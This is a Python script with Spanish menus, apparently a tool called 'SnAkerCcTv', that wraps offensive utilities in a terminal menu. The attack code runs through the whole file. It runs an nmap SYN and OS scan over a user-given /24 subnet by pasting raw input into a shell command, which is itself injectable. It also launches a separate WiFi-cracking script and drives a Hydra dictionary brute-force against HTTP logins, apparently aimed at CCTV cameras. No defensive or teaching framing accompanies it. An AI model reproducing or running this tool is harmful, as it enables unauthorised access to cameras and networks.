import os
import time
import sys
import threading

from subprocess import Popen, PIPE, STDOUT

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ variables $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


listamenu=["Menu de Opciones:", "1--Scan Ip ", "2--Selec Diccionario ","3--ataque", "4--Exit" ]#Menu Princcipal
exit=False
key=0
key1=""

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ LOGO $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
os.system('jp2a --colors --background=dark --invert /root/cctvhydra/logo.jpeg')
print("\033[1;31;1m ")
os.system('figlet .....SnAkerCcTv...')
print("					 Smp_A")
print("\033[1;37;1m ")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU PRINCIPAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


def menu():

	print("\033[1;31;1m ")
	print("\033[1;37;1m ")
	print("            "+listamenu[0])
	print("\033[1;37;m ")
	print("            "+listamenu[1])
	print("            "+listamenu[2])
	print("            "+listamenu[3])
	print("            "+listamenu[4])

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$	

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ funciones menu $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$	

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ funciones de servicios en ejecucion $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
def selec_hack():

	decision_hack=input("hack wifi y o n: ")
	decision_hack1=input("scan host y o n: ")
	if(decision_hack=='y'):
		WIFI()

	if(decision_hack1=='y'):
		ip=input("Introduzca ip: ")
		os.system('nmap -sS -O '+ip+'/24')
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def WIFI():		

	hack_wifi=threading.Thread(target=Hack_wifi, args=())
	hack_wifi.start()

def Hack_wifi(**datos):
	while True:
		try:
			print("Activacion Hack_wifi")
			process=Popen(['x-terminal-emulator', '-e', 'python3', '/root/cctvhydra/Esencial-craking-WiFi/cat_black_wifi.py'], stdout=PIPE, stderr=PIPE)
			stdout, stderr=process.communicate()	
			
			break
		except TypeError:
			MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")	
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def selec_diccionario():

	global diccionario_user
	global diccionario_password
	global ips

	dafault=input("Diccionario user defaut y o n: ")
	if(dafault=='y'):
		diccionario_user="/root/cctvhydra/username.txt"
		diccionario_password="/root/cctvhydra/Password.txt"
		ips=input("Introduzca ip: ")
	else:
		diccionario_user=input("enter diccionario user: ")
		diccionario_password=input("enter diccionario password: ")
		ips=input("Introduzca ip: ")
	return diccionario_user, diccionario_password, ips
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def ataque():
	print("Procesando datos")
	print(diccionario_user)	
	print(diccionario_password)
	print(ips)										
	At_hydra=threading.Thread(target=hydra, args=(diccionario_user,diccionario_password,ips,))
	At_hydra.start()

def hydra(diccionario_user,diccionario_password,ips, **datos):
	while True: 
		try:
			process_ataque=Popen(['x-terminal-emulator', '-e', 'hydra', '-L', diccionario_user, '-P', diccionario_password, '-e', 'ns', '-f', '-V', ips, 'http-get /'], stdout=PIPE, stderr=PIPE)
			stdout, stderr=process_ataque.communicate()	
			break
		except TypeError:
			MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$4 loop program $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

while exit==False:


	menu()
	key=(int(input("            "+"Select: ")))
	
	if (key==1):

		selec_hack()

	elif (key==2):

		selec_diccionario()
	
	elif (key==3):

		ataque()

	elif (key==4):

		exit=True
	
print("\033[1;31;1m ")	
print("Smp_A byTe_Dey_bYte_HackiNg")
print("\033[1;31;m ")

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$